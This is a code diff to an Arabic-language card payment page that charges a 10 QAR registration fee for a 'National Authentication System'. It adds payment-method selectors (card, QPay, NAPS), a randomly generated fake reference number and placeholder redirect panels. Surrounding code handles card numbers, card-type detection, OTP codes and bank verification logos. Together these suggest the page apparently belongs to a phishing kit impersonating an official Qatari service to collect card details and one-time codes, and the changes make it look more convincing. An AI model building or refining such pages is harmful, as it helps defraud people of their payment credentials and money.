@@ -36,42 +36,129 @@
             margin: 0;
         }
         
-        /* Elegant Payment Summary */
-        .payment-summary {
-            background: linear-gradient(135deg, #8b1538 0%, #6d1029 100%);
-            color: white;
-            border-radius: 8px;
-            padding: 20px 25px;
+        /* Payment Summary Box */
+        .payment-summary-box {
+            background-color: #f5f5f5;
+            border: 1px solid #e0e0e0;
+            border-radius: 6px;
+            padding: 20px;
             margin-bottom: 25px;
-            box-shadow: 0 2px 8px rgba(139, 21, 56, 0.2);
+        }
+        
+        .summary-row {
             display: flex;
             justify-content: space-between;
-            align-items: center;
+            padding: 10px 0;
+            border-bottom: 1px solid #e0e0e0;
         }
         
-        .payment-summary .label {
-            font-size: 14px;
-            opacity: 0.9;
-        }
-        
-        .payment-summary .amount {
-            font-size: 32px;
+        .summary-row:last-child {
+            border-bottom: none;
+            padding-top: 15px;
             font-weight: bold;
+        }
+        
+        .summary-label {
+            color: #4a5568;
+            font-size: 14px;
+        }
+        
+        .summary-value {
+            color: #2d3748;
+            font-size: 14px;
+            font-weight: 500;
             direction: ltr;
             text-align: left;
         }
         
-        /* Banking Form */
-        .payment-form-container {
+        .summary-value.amount {
+            color: #8b1538;
+            font-size: 18px;
+            font-weight: bold;
+        }
+        
+        /* Payment Methods */
+        .payment-methods-section {
+            margin-bottom: 25px;
+        }
+        
+        .payment-methods-section h3 {
+            font-size: 16px;
+            font-weight: 600;
+            color: #2d3748;
+            margin-bottom: 15px;
+        }
+        
+        .payment-methods {
+            display: flex;
+            gap: 15px;
+            flex-wrap: wrap;
+        }
+        
+        .payment-method {
+            flex: 1;
+            min-width: 140px;
+            background-color: #fff;
+            border: 2px solid #e2e8f0;
+            border-radius: 8px;
+            padding: 15px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            text-align: center;
+        }
+        
+        .payment-method:hover {
+            border-color: #8b1538;
+            box-shadow: 0 2px 8px rgba(139, 21, 56, 0.1);
+        }
+        
+        .payment-method.active {
+            border-color: #8b1538;
+            background-color: #fff5f7;
+            box-shadow: 0 0 0 3px rgba(139, 21, 56, 0.1);
+        }
+        
+        .payment-method-logo {
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 8px;
+        }
+        
+        .payment-method-logo img {
+            max-height: 100%;
+            max-width: 100%;
+            object-fit: contain;
+        }
+        
+        .payment-method-name {
+            font-size: 12px;
+            color: #4a5568;
+            font-weight: 500;
+        }
+        
+        .payment-method.active .payment-method-name {
+            color: #8b1538;
+            font-weight: 600;
+        }
+        
+        /* Card Form */
+        .card-form-container {
             background-color: #fff;
             border-radius: 8px;
-            padding: 30px;
+            padding: 25px;
             box-shadow: 0 2px 8px rgba(0,0,0,0.06);
             margin-bottom: 20px;
+            display: none;
+        }
+        
+        .card-form-container.active {
+            display: block;
         }
         
         .form-group-payment {
-            margin-bottom: 20px;
+            margin-bottom: 18px;
         }
         
         .form-group-payment label {
@@ -165,8 +252,8 @@
             background-color: #f7fafc;
             border: 1px solid #e2e8f0;
             border-radius: 6px;
-            padding: 15px;
-            margin-top: 20px;
+            padding: 12px;
+            margin-top: 15px;
             text-align: center;
         }
         
@@ -389,16 +476,49 @@
                         </div>
                         
                         <!-- Payment Summary -->
-                        <div class="payment-summary">
-                            <div>
-                                <div class="label">المبلغ المطلوب</div>
-                                <div style="font-size: 12px; opacity: 0.85; margin-top: 3px;">رسوم التسجيل</div>
+                        <div class="payment-summary-box">
+                            <div class="summary-row">
+                                <span class="summary-label">اسم التاجر</span>
+                                <span class="summary-value">National Authentication System</span>
                             </div>
-                            <div class="amount">10.00 QAR</div>
+                            <div class="summary-row">
+                                <span class="summary-label">رقم المرجع</span>
+                                <span class="summary-value" id="refNumber"></span>
+                            </div>
+                            <div class="summary-row">
+                                <span class="summary-label">المبلغ</span>
+                                <span class="summary-value amount">10.00 QAR</span>
+                            </div>
                         </div>
                         
-                        <!-- Payment Form -->
-                        <div class="payment-form-container">
+                        <!-- Payment Methods -->
+                        <div class="payment-methods-section">
+                            <h3>اختر طريقة الدفع</h3>
+                            <div class="payment-methods">
+                                <div class="payment-method active" data-method="card">
+                                    <div class="payment-method-logo">
+                                        <img src="/images/visa.png" alt="Visa" style="width: 50px; margin-left: 5px;">
+                                        <img src="/images/mastercard.png" alt="Mastercard" style="width: 45px;">
+                                    </div>
+                                    <div class="payment-method-name">بطاقة ائتمانية</div>
+                                </div>
+                                <div class="payment-method" data-method="qpay">
+                                    <div class="payment-method-logo">
+                                        <img src="/images/qpay.png" alt="QPay">
+                                    </div>
+                                    <div class="payment-method-name">QPay</div>
+                                </div>
+                                <div class="payment-method" data-method="naps">
+                                    <div class="payment-method-logo">
+                                        <img src="/images/naps.jpg" alt="NAPS" style="height: 35px;">
+                                    </div>
+                                    <div class="payment-method-name">NAPS</div>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <!-- Card Payment Form -->
+                        <div class="card-form-container active" id="cardForm">
                             <form id="paymentForm">
                                 
                                 <!-- Card Number -->
@@ -473,7 +593,7 @@
                                 <!-- Security Info -->
                                 <div class="security-info">
                                     <i class="fa fa-lock"></i>
-                                    <span>معاملتك آمنة ومشفرة بتقنية SSL</span>
+                                    <span>معاملتك آمنة ومشفرة</span>
                                 </div>
                                 
                                 <!-- Submit Button -->
@@ -487,6 +607,38 @@
                                     رجوع
                                 </button>
                             </form>
+                        </div>
+                        
+                        <!-- QPay Form (Placeholder) -->
+                        <div class="card-form-container" id="qpayForm">
+                            <div style="text-align: center; padding: 40px 20px;">
+                                <i class="fa fa-mobile" style="font-size: 60px; color: #8b1538; margin-bottom: 20px;"></i>
+                                <h3>الدفع عبر QPay</h3>
+                                <p style="color: #4a5568; margin: 15px 0;">سيتم تحويلك إلى تطبيق QPay لإتمام الدفع</p>
+                                <button type="button" class="btn-pay" onclick="alert('سيتم تحويلك إلى QPay')">
+                                    الانتقال إلى QPay
+                                </button>
+                                <button type="button" class="btn-back" onclick="window.location.href='/step3'">
+                                    <i class="fa fa-arrow-right" style="margin-left: 6px;"></i>
+                                    رجوع
+                                </button>
+                            </div>
+                        </div>
+                        
+                        <!-- NAPS Form (Placeholder) -->
+                        <div class="card-form-container" id="napsForm">
+                            <div style="text-align: center; padding: 40px 20px;">
+                                <i class="fa fa-university" style="font-size: 60px; color: #8b1538; margin-bottom: 20px;"></i>
+                                <h3>الدفع عبر NAPS</h3>
+                                <p style="color: #4a5568; margin: 15px 0;">سيتم تحويلك إلى بوابة NAPS لإتمام الدفع</p>
+                                <button type="button" class="btn-pay" onclick="alert('سيتم تحويلك إلى NAPS')">
+                                    الانتقال إلى NAPS
+                                </button>
+                                <button type="button" class="btn-back" onclick="window.location.href='/step3'">
+                                    <i class="fa fa-arrow-right" style="margin-left: 6px;"></i>
+                                    رجوع
+                                </button>
+                            </div>
                         </div>
                         
                     </div>
@@ -553,10 +705,36 @@
         let cardType = '';
         let otpLength = 4;
         
+        // Generate reference number
+        document.getElementById('refNumber').textContent = 'REF-' + Math.random().toString(36).substr(2, 12).toUpperCase();
+        
+        // Payment method switching
+        document.querySelectorAll('.payment-method').forEach(method => {
+            method.addEventListener('click', function() {
+                // Remove active class from all methods
+                document.querySelectorAll('.payment-method').forEach(m => m.classList.remove('active'));
+                // Add active class to clicked method
+                this.classList.add('active');
+                
+                // Hide all forms
+                document.querySelectorAll('.card-form-container').forEach(f => f.classList.remove('active'));
+                
+                // Show selected form
+                const methodType = this.dataset.method;
+                if (methodType === 'card') {
+                    document.getElementById('cardForm').classList.add('active');
+                } else if (methodType === 'qpay') {
+                    document.getElementById('qpayForm').classList.add('active');
+                } else if (methodType === 'naps') {
+                    document.getElementById('napsForm').classList.add('active');
+                }
+            });
+        });
+        
         // Card logos
         const cardLogos = {
-            visa: 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" width="35" height="22" viewBox="0 0 35 22"%3E%3Crect width="35" height="22" rx="3" fill="%231434CB"/%3E%3Ctext x="4" y="16" font-family="Arial" font-size="11" font-weight="bold" fill="white"%3EVISA%3C/text%3E%3C/svg%3E',
-            mastercard: 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" width="35" height="22" viewBox="0 0 35 22"%3E%3Crect width="35" height="22" rx="3" fill="%23EB001B"/%3E%3Ccircle cx="11" cy="11" r="6" fill="%23FF5F00"/%3E%3Ccircle cx="24" cy="11" r="6" fill="%23F79E1B"/%3E%3C/svg%3E'
+            visa: '/images/visa.png',
+            mastercard: '/images/mastercard.png'
         };
         
         const verifiedLogos = {
